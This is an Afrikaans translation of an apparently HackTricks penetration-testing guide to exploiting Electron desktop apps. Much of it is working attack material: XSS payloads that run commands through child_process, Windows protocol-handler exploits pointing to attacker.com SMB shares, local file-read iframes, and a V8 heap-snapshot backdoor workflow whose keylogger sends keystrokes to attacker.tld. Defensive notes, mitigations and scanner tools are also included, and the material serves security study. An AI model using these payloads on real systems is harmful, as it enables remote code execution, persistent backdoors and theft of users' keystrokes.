# Electron Desktop-apps

{{#include ../../../banners/hacktricks-training.md}}

## Inleiding

Electron kombineer 'n plaaslike backend (met **NodeJS**) en 'n frontend (**Chromium**), alhoewel dit 'n paar van die sekuriteitsmeganismes van moderne blaaiers ontbreek.

Gewoonlik sal jy die electron-app-kode binne 'n `.asar` toepassing vind; om die kode te verkry moet jy dit onttrek:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
In die bronkode van 'n Electron-app, binne `packet.json`, kan jy die `main.js`-lêer vind waarin sekuriteitskonfigurasies gestel is.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron het 2 proses-tipes:

- Main Process (het volle toegang tot NodeJS)
- Renderer Process (moet beperkte toegang tot NodeJS hê om sekuriteitsredes)

![](<../../../images/image (182).png>)

'n **renderer process** sal 'n browservenster wees wat 'n lêer laai:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Instellings van die **renderer-proses** kan in die **main-proses** binne die main.js-lêer **gekonfigureer** word. Sommige van die konfigurasies sal die Electron-toepassing verhinder om RCE of ander kwesbaarhede te kry as die **instellings korrek gekonfigureer** is.

Die Electron-toepassing **kan toegang tot die toestel kry** via Node APIs alhoewel dit gekonfigureer kan word om dit te voorkom:

- **`nodeIntegration`** - is `off` as verstek. As dit `on` is, maak dit toegang tot Node-funksies vanaf die renderer-proses moontlik.
- **`contextIsolation`** - is `on` as verstek. As dit `off` is, is die main- en renderer-prosesse nie geïsoleer nie.
- **`preload`** - leeg as verstek.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - is `off` as verstek. Dit sal die aksies wat NodeJS kan uitvoer beperk.
- Node integrasie in Workers
- **`nodeIntegrationInSubframes`** - is `off` as verstek.
- As **`nodeIntegration`** **geaktiveer** is, sal dit die gebruik van **Node.js APIs** in webbladsye wat **in iframes gelaai** word binne 'n Electron-toepassing toelaat.
- As **`nodeIntegration`** **gedeaktiveer** is, sal preloads in die iframe gelaai word

Example of configuration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Sommige **RCE payloads** van [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Vang verkeer

Wysig die start-main-konfigurasie en voeg die gebruik van 'n proxy by, soos:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

As jy 'n Electron App lokaal kan uitvoer, is dit moontlik dat jy dit kan laat arbitrêre JavaScript-kode uitvoer. Kyk hoe in:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

As die **nodeIntegration** op **on** gestel is, kan 'n webblad se JavaScript maklik Node.js-funksies gebruik net deur die `require()` aan te roep. Byvoorbeeld, die manier om die calc application op Windows uit te voer is:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Die script wat in hierdie instelling aangedui word is l**oaded before other scripts in the renderer**, daarom het dit **unlimited access to Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Daarom kan die script node-features na pages exporteer:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **As `contextIsolation` aangeskakel is, sal dit nie werk nie**

## RCE: XSS + contextIsolation

Die _**contextIsolation**_ skep die **geskeide kontekste tussen die webbladskripte en die JavaScript interne kode van Electron** sodat die JavaScript-uitvoering van elke kode mekaar nie beïnvloed nie. Dit is 'n noodsaaklike funksie om die moontlikheid van RCE uit te skakel.

As die kontekste nie geïsoleer is nie, kan 'n aanvaller:

1. Voer **arbitrary JavaScript in renderer** uit (XSS of navigasie na eksterne webwerwe)
2. **Oorskryf die ingeboude metode** wat in preload of in Electron se interne kode gebruik word om 'n funksie oor te neem
3. **Aktiveer** die gebruik van die **oorskrewe funksie**
4. RCE?

Daar is 2 plekke waar ingeboude metodes oorskryf kan word: in preload-kode of in Electron se interne kode:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Omseil van klikgebeurtenis

As daar beperkings toegepas word wanneer jy op 'n skakel klik, kan jy dit moontlik omseil deur 'n **middelkliek** te gebruik in plaas van 'n gewone linkerkliek.
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Vir meer inligting oor hierdie voorbeelde, sien [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) en [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Wanneer 'n Electron desktop application ontplooi word, is dit noodsaaklik om die korrekte instellings vir `nodeIntegration` en `contextIsolation` te verseker. Dit is vasgestel dat **client-side remote code execution (RCE)** wat preload scripts of Electron's native code vanaf die main process teiken, effektief voorkom word met hierdie instellings in plek.

Wanneer 'n gebruiker met links omgaan of nuwe vensters open, word spesifieke event listeners geaktiveer, wat kritiek is vir die toepassing se sekuriteit en funksionaliteit:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Hierdie listeners word **oorskryf deur die desktop-toepassing** om sy eie **besigheidslogika** te implementeer. Die toepassing bepaal of 'n genavigeerde skakel intern of in 'n eksterne webblaaier geopen moet word. Hierdie besluit word gewoonlik deur 'n funksie, `openInternally`, geneem. As hierdie funksie `false` teruggee, dui dit aan dat die skakel eksterne geopen moet word deur gebruik te maak van die `shell.openExternal` funksie.

**Hier is 'n vereenvoudigde pseudokode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Electron JS se beste sekuriteitspraktyke raai aan om nie onbetroubare inhoud met die `openExternal` funksie te aanvaar nie, aangesien dit tot RCE deur verskeie protokolle kan lei. Bedryfstelsels ondersteun verskillende protokolle wat RCE kan veroorsaak. Vir gedetailleerde voorbeelde en verdere verduideliking oor hierdie onderwerp kan mens na [hierdie bron](https://positive.security/blog/url-open-rce#windows-10-19042) verwys, wat Windows-protokolvoorbeelde bevat wat hierdie kwesbaarheid kan uitbuit.

In macos kan die `openExternal` funksie uitgebuit word om arbitrêre opdragte uit te voer, byvoorbeeld `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Voorbeelde van Windows-protokoluitbuitings sluit in:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + kwesbare preload IPC + shell.openExternal

Hierdie vuln kan gevind word in **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

Die **webviewTag** is 'n **verouderde funksie** wat die gebruik van **NodeJS** in die **renderer process** toelaat, wat gedeaktiveer moet word aangesien dit toelaat om 'n skrip binne die preload context te laai soos:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Gevolglik kan 'n aanvaller wat daarin slaag om 'n ewekansige bladsy te laai, daardie tag gebruik om **load an arbitrary preload script**.

Hierdie preload script is toe misbruik om 'n **kwetsbare IPC-diens (`skype-new-window`)** aan te roep wat calling calling **`shell.openExternal`** gebruik het om RCE te kry:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Lees interne lêers: XSS + contextIsolation

**Om `contextIsolation` te deaktiveer maak die gebruik van `<webview>`-tags moontlik**, soortgelyk aan `<iframe>`, vir die lees van plaaslike lêers en om data te exfiltrate.

'n Voorbeeld toon hoe om hierdie kwesbaarheid te misbruik om die inhoud van interne lêers te lees:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Verder word nog 'n metode vir **die lees van 'n interne lêer** gedeel, wat 'n kritieke lokale lêer-lesings-kwesbaarheid in 'n Electron desktop app beklemtoon. Dit behels die inspuiting van 'n script om die toepassing te misbruik en data te exfiltrate:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Oud Chromium**

As die **chromium** wat deur die toepassing gebruik word **oud** is en daar **bekende** **vulnerabilities** daarop is, kan dit moontlik wees om dit te **exploit** en RCE te verkry deur 'n XSS.\
Jy kan 'n voorbeeld sien in hierdie **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

As jy 'n XSS gevind het maar jy **kan nie RCE trigger of interne lêers steel nie**, kan jy probeer om dit te gebruik om **credentials via phishing te steel**.

Eers moet jy weet wat gebeur wanneer jy probeer om 'n nuwe URL te open, deur die JS-kode in die front-end na te gaan:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Die oproep na **`openInternally`** bepaal of die **link** **geopen** sal word in die **desktopvenster** aangesien dit 'n link is wat aan die platform behoort, **of** dit in die **blaaier as 'n derdepartye hulpbron** geopen sal word.

Indien die **regex** wat deur die funksie gebruik word **vulnerable to bypasses** (byvoorbeeld deur **not escaping the dots of subdomains**) kan 'n aanvaller die XSS misbruik om **open a new window which** wat in die aanvaller se infrastruktuur geleë sal wees en die gebruiker **asking for credentials**:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protokol

As mentioned in [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) pages running on **`file://`** het eenzijdige toegang tot elke lêer op jou masjien, wat beteken dat **XSS** gebruik kan word om willekeurige lêers van die gebruiker se masjien te laai. Die gebruik van 'n **aangepaste protokol** voorkom sulke probleme aangesien jy die protokol kan beperk tot slegs die bediening van 'n spesifieke stel lêers.

## Remote module

Die Electron Remote module laat **renderer processes to access main process APIs**, wat kommunikasie binne 'n Electron-toepassing vergemaklik. Die aktivering van hierdie module bring egter beduidende sekuriteitsrisiko's mee. Dit vergroot die toepassing se aanvaloppervlakte en maak dit meer vatbaar vir kwesbaarhede soos cross-site scripting (XSS) aanvalle.

> [!TIP]
> Alhoewel die **remote** module sommige APIs van main na renderer processes blootstel, is dit nie eenvoudig om RCE slegs deur die komponente te misbruik te kry nie. Die komponente kan egter sensitiewe inligting blootstel.

> [!WARNING]
> Baie apps wat steeds die remote module gebruik, doen dit op 'n wyse wat **require NodeIntegration to be enabled** in die renderer process, wat 'n **enorme sekuriteitsrisiko** is.

Sedert Electron 14 kan die `remote` module van Electron op verskeie maniere aangeskakel wees; weens sekuriteits- en prestasie-redes word dit **aanbeveel om dit nie te gebruik nie**.

Om dit te aktiveer, moet dit eers **in die main process aangeskakel word**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Dan kan die renderer-proses objekte uit die module invoer soos:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
Die **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** dui op 'n paar interessante **funksies** wat deur die objek **`app`** van die remote module blootgestel word:

- **`app.relaunch([options])`**
- **Herbegin** die toepassing deur die huidige instansie te **beëindig** en 'n nuwe een te **lanseer**. Nuttig vir **app-opdaterings** of betekenisvolle **toestandveranderinge**.
- **`app.setAppLogsPath([path])`**
- **Bepaal** of **skep** 'n gids vir die stoor van **app logs**. Die logs kan met **`app.getPath()`** of **`app.setPath(pathName, newPath)`** **verkry** of **gewysig** word.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Registreer** die huidige uitvoerbare as die **standaardbehandelaar** vir 'n gespesifiseerde **protocol**. Jy kan 'n **aangepaste pad** en **argumente** verskaf indien nodig.
- **`app.setUserTasks(tasks)`**
- **Voeg** take by die **Tasks-kategorie** in die **Jump List** (op Windows). Elke taak kan beheer hoe die app **gestart** word of watter **argumente** deurgegee word.
- **`app.importCertificate(options, callback)`**
- **Importeer** 'n **PKCS#12-sertifikaat** in die stelsel se **sertifikaatwinkel** (slegs Linux). 'n **callback** kan gebruik word om die resultaat te hanteer.
- **`app.moveToApplicationsFolder([options])`**
- **Skuif** die toepassing na die **Applications folder** (op macOS). Dit help om 'n **standaardinstallasie** vir Mac-gebruikers te verseker.
- **`app.setJumpList(categories)`**
- **Stel** of **verwyder** 'n **aangepaste Jump List** op **Windows**. Jy kan **kategorieë** spesifiseer om te organiseer hoe take aan die gebruiker verskyn.
- **`app.setLoginItemSettings(settings)`**
- **Konfigureer** watter **uitvoerbare** by **aanmelding** begin saam met hul **opsies** (slegs macOS en Windows).

Voorbeeld:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences module

Die **primêre API** vir toegang tot stelselvoorkeure en die **uitsending van stelselgebeure** in Electron. Metodes soos **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, en **setUserDefault** is almal **deel van** hierdie module.

**Voorbeeldgebruik:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Luister** na **inheemse macOS-kennisgewings** using NSDistributedNotificationCenter.
* Voor **macOS Catalina** kon jy sniff **all** distributed notifications deur **nil** aan CFNotificationCenterAddObserver te gee.
* Na **Catalina / Big Sur** kan sandboxed apps steeds **subscribe** na **many events** (byvoorbeeld, **screen locks/unlocks**, **volume mounts**, **network activity**, ens.) deur kennisgewings **by name** te registreer.

### **getUserDefault / setUserDefault**

* **Koppel** aan **NSUserDefaults**, wat **application** of **global** voorkeurinstellings op macOS stoor.

* **getUserDefault** kan sensitiewe inligting **retrieve**, soos **recent file locations** of die **user’s geographic location**.

* **setUserDefault** kan hierdie voorkeurinstellings **modify**, wat moontlik 'n app se **configuration** kan beïnvloed.

* In **older Electron versions** (before v8.3.0) was slegs die **standard suite** van NSUserDefaults **accessible**.

## Shell.showItemInFolder

Hierdie funksie wys die gegewe lêer in 'n lêerbestuurder, wat die lêer **could automatically execute the file**.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Electron apps should have a **Content Security Policy (CSP)** to **prevent XSS attacks**. The **CSP** is a **security standard** that helps **prevent** the **execution** of **untrusted code** in the browser.

Dit word gewoonlik **configured** in die **`main.js`** lêer of in die **`index.html`** templaat met die CSP binne 'n **meta tag**.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Hierdie werklike ketting het Visual Studio Code 1.63 geraak (CVE-2021-43908) en demonstreer hoe 'n enkele markdown-driven XSS in 'n webview tot volle RCE opgegradeer kan word wanneer CSP, postMessage, en scheme handlers verkeerd gekonfigureer is. Public PoC: https://github.com/Sudistark/vscode-rce-electrovolt

Oorsig van die aanvalsketting
- First XSS via webview CSP: Die gegenereerde CSP het `style-src 'self' 'unsafe-inline'` ingesluit, wat inline/style-gebaseerde injection in 'n `vscode-webview://` konteks toegelaat het. Die payload beaconed na `/stealID` om die target webview’s extensionId te leak/exfiltrate.
- Constructing target webview URL: Gebruik die leaked ID om `vscode-webview://<extensionId>/.../<publicUrl>` te bou.
- Second XSS via postMessage trust: Die buitenste webview het `window.postMessage` vertrou sonder streng origin/type checks en het attacker HTML gelaai met `allowScripts: true`.
- Local file loading via scheme/path rewriting: Die payload het `file:///...` na `vscode-file://vscode-app/...` herskryf en `exploit.md` met `RCE.html` geruil, en misbruik gemaak van swak pad-validasie om 'n bevoorregte plaaslike hulpbron te laai.
- RCE in Node-enabled context: Die gelaaide HTML het met Node APIs beskikbaar uitgevoer, wat uitvoering van OS-opdragte toegelaat het.

Voorbeeld RCE primitive in die finale konteks
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```
Gekoppelde leesstof oor postMessage vertrouenskwessies:

{{#ref}}
../../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## **Gereedskap**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) is 'n hulpmiddel om wankonfigurasies en sekuriteits-anti-patterns in Electron-based applications te identifiseer.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) is 'n open source VS Code-plugin vir Electron applications wat Electronegativity gebruik.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) om kwesbare derdeparty-biblioteke na te gaan
- [**Electro.ng**](https://electro.ng/): Jy moet dit koop

## Labore

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) kan jy 'n lab vind om kwesbare Electron apps te exploit.

Sommige opdragte wat jou in die lab sal help:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron- en Chromium-gebaseerde apps deserialiseer 'n voorafgeboude V8 heap snapshot tydens opstart (v8_context_snapshot.bin, en opsioneel browser_v8_context_snapshot.bin) om elke V8 isolate te initialise (main, preload, renderer). Histories het Electron se integriteitsfuses hierdie snapshots nie as uitvoerbare inhoud beskou nie, sodoende het hulle beide fuse-based integriteitsafdwinging en OS code-signing kontroles omseil. Gevolglik het die vervanging van die snapshot in 'n deur-gebruiker-skryfbare installasie stilletjies volhoubare kode-uitvoering binne die app moontlik gemaak sonder om die ondertekende binaries of ASAR te verander.

Belangrike punte
- Integriteitsgaping: EnableEmbeddedAsarIntegrityValidation en OnlyLoadAppFromAsar valideer app JavaScript binne die ASAR, maar het nie V8 heap snapshots gedek nie (CVE-2025-55305). Chromium kontroleer ook nie die integriteit van snapshots nie.
- Aanvalsvoorwaardes: Lokale lêerskryf na die app se installasiegids. Dit is algemeen op stelsels waar Electron-apps of Chromium-browsers onder deur-gebruiker-skryfbare paadjies geïnstalleer is (bv. %AppData%\Local op Windows; /Applications met voorbehoude op macOS).
- Effek: Betroubare uitvoering van aanvaller se JavaScript in enige isolate deur 'n gereeld gebruikte builtin (’n “gadget”) te oorskryf, wat volhoubaarheid en ontwiking van code-signing verifikasie moontlik maak.
- Getroffen oppervlak: Electron-apps (selfs met fuses geaktiveer) en Chromium-gebaseerde browsers wat snapshots vanaf deur-gebruiker-skryfbare plekke laai.

Genereer 'n kwaadwillige snapshot sonder om Chromium te bou
- Gebruik die voorafgeboude electron/mksnapshot om 'n payload JS in 'n snapshot saam te stel en die toepassing se v8_context_snapshot.bin te oorskryf.

Voorbeeld van 'n minimale payload (bewys uitvoering deur 'n crash te forceer)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (voer verskillende kode uit in main vs. renderer)
- Main process detection: Node-only globals soos process.pid, process.binding(), of process.dlopen is aanwesig in die main process isolate.
- Browser/renderer detection: Browser-only globals soos alert is beskikbaar wanneer dit in 'n dokumentkonteks uitgevoer word.

Voorbeeld-gadget wat een keer die main-proses Node-vermoëns ondersoek
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-context gegewensdiefstal PoC (bv. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator-werkvloei
1) Skryf payload.js wat 'n algemene builtin (e.g., Array.isArray) oor-skryf en opsioneel per isolate takke uitvoer.
2) Bou die snapshot sonder Chromium-bronne:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Oorskryf die geteikende toepassing se snapshot-lêer(s):
- v8_context_snapshot.bin (always used)
- browser_v8_context_snapshot.bin (if the LoadBrowserProcessSpecificV8Snapshot fuse is used)
4) Start die toepassing; die gadget voer uit wanneer die gekose builtin gebruik word.

Aantekeninge en oorwegings
- Integriteit/handtekening-omseiling: Snapshot-lêers word nie deur code-signing checks as native uitvoerbare lêers behandel nie en was (histories) nie deur Electron se fuses of Chromium integriteitskontroles gedek nie.
- Persistensie: Die vervanging van die snapshot in 'n gebruiker-skryfbare installasie oorleef gewoonlik app-herlaaisels en lyk soos 'n gesigneerde, legitieme app.
- Chromium-blaaiers: Dieselfde manipulasie-konsep geld vir Chrome/derivatives wat in gebruiker-skryfbare liggings geïnstalleer is. Chrome het ander integriteitsmitigasies, maar sluit fisies plaaslike aanvalle eksplisiet uit van sy bedreigingsmodel.

Opsporing en mitigasies
- Behandel snapshot-lêers as uitvoerbare inhoud en sluit dit in by integriteitsafdwinging (CVE-2025-55305 fix).
- Gee voorkeur aan admin-writable-only install locations; bepaal basislyn en monitor hashes vir v8_context_snapshot.bin en browser_v8_context_snapshot.bin.
- Detect vroegtydige runtime builtin oor-skrywing en onverwagte snapshot-wijzigings; waarsku wanneer gedeserialiseerde snapshots nie met verwagte waardes ooreenstem nie.

## **Verwysings**

- [SecureLayer7: Electron Research in Desktop apps (Part 1)](https://blog.securelayer7.net/electron-app-security-risks/)
- [VS Code RCE PoC (CVE-2021-43908) – electrovolt](https://github.com/Sudistark/vscode-rce-electrovolt)
- [GitHub Advisory GHSA-2q4g-w47c-4674 (CVE-2020-15174)](https://github.com/advisories/GHSA-2q4g-w47c-4674)
- [MSRC: CVE-2021-43908](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43908)
- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)
- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
